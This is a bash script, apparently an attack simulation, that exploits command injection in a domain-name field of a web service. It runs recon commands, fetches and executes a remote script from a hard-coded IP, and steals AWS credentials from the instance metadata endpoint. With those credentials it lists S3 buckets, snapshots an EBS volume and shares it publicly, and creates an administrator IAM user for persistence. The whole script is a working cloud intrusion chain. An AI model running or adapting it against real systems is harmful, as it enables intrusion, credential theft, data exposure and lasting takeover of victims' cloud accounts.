#!/bin/bash
set -e

if [[ $# -ne 1 ]]; then
  echo "Usage: run-attack.sh alb-url"
  exit 1
fi

function request() {
  curl -s $url/test-domain -H "Content-Type: application/json" -X POST -d "{\"domainName\":\"$1\"}"
  echo
}
function run() {
  cmd=$1
  request "google.com && $cmd"
}
function randomSleep() {
  sleep $((RANDOM % 4))
}

url=$1

# Recon
echo "Performing recon"
request "google.com"
randomSleep

request "aaaaa"
randomSleep

request '$(whoami)'
randomSleep

request '\`whoami\`'
randomSleep

run "whoami"
randomSleep

run "pwd"
randomSleep

run "cat /etc/os-release"
randomSleep

run "cat /proc/cpuinfo"

# Real attack
sleep 5
echo "Attacking"
run "/usr/bin/wget 143.198.125.69/a.sh -O /tmp/a && chmod +x /tmp/a && sh /tmp/a"

# Steal AWS creds
sleep 10
roleName=$(run 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/' | grep -oE '(prod-cluster-[0-9]+)')
randomSleep
creds=$(run "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$roleName" | tail -n9)
export AWS_ACCESS_KEY_ID=$(echo $creds | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $creds | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $creds | jq -r '.Token')
aws sts get-caller-identity
randomSleep

# Enumerate EBS volumes
echo "Listing S3 buckets"
aws s3 ls
randomSleep

echo "Listing EBS volumes and finding a juicy one"
VOLUME_ID=$(aws ec2 describe-volumes | jq -r '.Volumes[] | select(.Size == 1) | .VolumeId')

echo "Taking snapshot of $VOLUME_ID"
SNAPSHOT_ID=$(aws ec2 create-snapshot --volume-id $VOLUME_ID | jq -r .SnapshotId)

echo "Waiting for snapshot"
aws ec2 wait snapshot-completed --filters Name=snapshot-id,Values=$SNAPSHOT_ID

echo "Sharing snapshot publicly"
randomSleep
aws ec2 modify-snapshot-attribute --snapshot-id $SNAPSHOT_ID --attribute createVolumePermission --operation-type add --group-names all

# Create an IAM user for persistence
sleep 10
aws iam create-user --user-name support
aws iam attach-user-policy --user-name support --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name support